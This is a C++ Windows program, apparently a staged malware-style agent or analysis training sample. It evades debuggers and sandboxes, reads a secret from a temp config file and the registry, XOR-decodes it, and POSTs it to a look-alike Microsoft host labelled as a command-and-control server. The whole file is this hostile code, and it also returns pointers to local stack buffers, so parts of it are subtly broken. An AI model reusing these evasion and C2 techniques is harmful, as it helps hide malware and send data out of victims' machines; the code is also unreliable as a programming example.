// c2dropped.cpp : This file contains the 'main' function. Program execution begins and ends there.
//
#include "stdafx.h"
#include "agent.h"

#define SLEEP_PERIOD 1000 * 60 * 20 // 20 minutes.
#define MAX_STR_LEN 100


CHAR* ConnectToCnC(CHAR* Data)
{
	HINTERNET hIntSession, hHttpSession, hHttpRequest;
	hIntSession = InternetOpen(L"Haxx User Agent", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
	if (hIntSession == NULL) {
		printf("Unable to run the operation.\n");
		exit(-1);
	}

	hHttpSession = InternetConnect(hIntSession, L"rnicrosoft.pythonanywhere.com", 80, 0, 0, INTERNET_SERVICE_HTTP, 0, NULL);
	if (hHttpSession == NULL) {
		printf("Unable to run the operation.\n");
		exit(-1);
	}

	hHttpRequest = HttpOpenRequest(hHttpSession, L"POST", L"/verify",
		0, 0, 0, INTERNET_FLAG_RELOAD, 0);
	if (hHttpRequest == NULL) {
		printf("Unable to run the operation.\n");
		exit(-1);
	}

	// Prepare the request form parameters.
	CHAR Buff[MAX_PATH] = "key=";
	strcat(Buff, Data);

	WCHAR szHeaders[] = L"Content-Type: application/x-www-form-urlencoded;";
	if (!HttpSendRequest(hHttpRequest, szHeaders, wcslen(szHeaders),
		(LPVOID)Buff, strlen(Buff))) {
		printf("Unable to run the operation.\n");
		exit(-1);
	}

	CHAR szBuffer[MAX_PATH] = "";
	DWORD dwRead = 0;
	while (InternetReadFile(hHttpRequest, szBuffer, sizeof(szBuffer) - 1, &dwRead) && dwRead) {
		szBuffer[dwRead] = 0;
		dwRead = 0;
	}

	InternetCloseHandle(hHttpRequest);
	InternetCloseHandle(hHttpSession);
	InternetCloseHandle(hIntSession);

	return szBuffer;
}

BYTE* ReadRegistry() {
	HKEY hKey;
	LONG lRes;

	lRes = RegOpenKeyExA(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Calc", 0, KEY_READ, &hKey);
	if (lRes != ERROR_SUCCESS) {
		printf("Unable to run the operation.\n");
		exit(-1);
	}

	DWORD Type;
	BYTE dwReturn[MAX_STR_LEN] ;
	DWORD dwBufSize = sizeof(dwReturn);

	lRes = RegQueryValueExA(hKey, "AdvCalc", NULL, &Type, dwReturn, &dwBufSize);
	if (lRes != ERROR_SUCCESS) {
		printf("Unable to run the operation.\n");
		exit(-1);
	}

	return dwReturn;
}

CHAR* ReadConfig(LPCSTR lpFileName) {
	HANDLE hFile;
	hFile = CreateFileA(lpFileName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		printf("Unable to run the operation.\n");
		exit(-1);
	}

	CHAR ReturnedString[MAX_STR_LEN];
	DWORD NumberOfChar = 0;
	NumberOfChar = GetPrivateProfileStringA("secret", "key", NULL, ReturnedString, MAX_STR_LEN, lpFileName);
	if (NumberOfChar == 0 || ReturnedString == "") {
		CloseHandle(hFile);
		printf("Unable to run the operation.\n");
		exit(-1);
	}
	CloseHandle(hFile);
	return ReturnedString;
}

CHAR* Decode(CHAR* Key)
{
	DWORD Count = 0;
	CHAR Key1 = 0x9f;
	CHAR Key2 = 0x33;
	CHAR TempKey;

	INT Index = 0;
	CHAR Buff[MAX_PATH] = "";
	CHAR Result[MAX_PATH] = "";
	BYTE Res;
	while (Count < strlen(Key)) {
		Count++;
		if (Count % 2 == 0) {
			TempKey = Key1;
		}
		else {
			TempKey = Key2;
		}

		Res = TempKey ^ Key[Index];
		sprintf(Buff, "%c", Res);
		strcat(Result, Buff);
		Index++;
	}

	return Result;
}

VOID VerifyKey() {
	CHAR FilePath[MAX_PATH];
	GetTempPathA(MAX_PATH, FilePath);
	strcat(FilePath, "config.ini");

	CHAR ConfigKey[MAX_PATH] = "";
	strcpy(ConfigKey, ReadConfig(FilePath));

	CHAR DecodedKey[MAX_PATH] = "";
	strcpy(DecodedKey, Decode(ConfigKey));

	CHAR RegistryKey[MAX_PATH] = "";
	strcpy(RegistryKey, (CHAR*)ReadRegistry());
	int res = memcmp(RegistryKey, DecodedKey, 22);
	if (res != 0) {
		printf("Unable to run the operation.\n");
		exit(-1);
	}

	printf("Stage 3 successful.\n");

	CHAR Response[MAX_PATH] = "";
	strcpy(Response, (CHAR*)ConnectToCnC(ConfigKey));
	printf("Response from C2: %s\n", Response);

}

VOID AntiDebug()
{
	if (IsDebuggerPresent()) {
		printf("Unable to run the operation.\n");
		exit(-1);
	}
	printf("Stage 1 successful.\n");

}

VOID AntiSandbox()
{
	Sleep(SLEEP_PERIOD);
	printf("Stage 2 successful.\n");
}

int main()
{
	printf("Agent starts ...\n");

	AntiDebug();
	AntiSandbox();
	VerifyKey();

	printf("Agent ends ...\n");
	return 0;
}
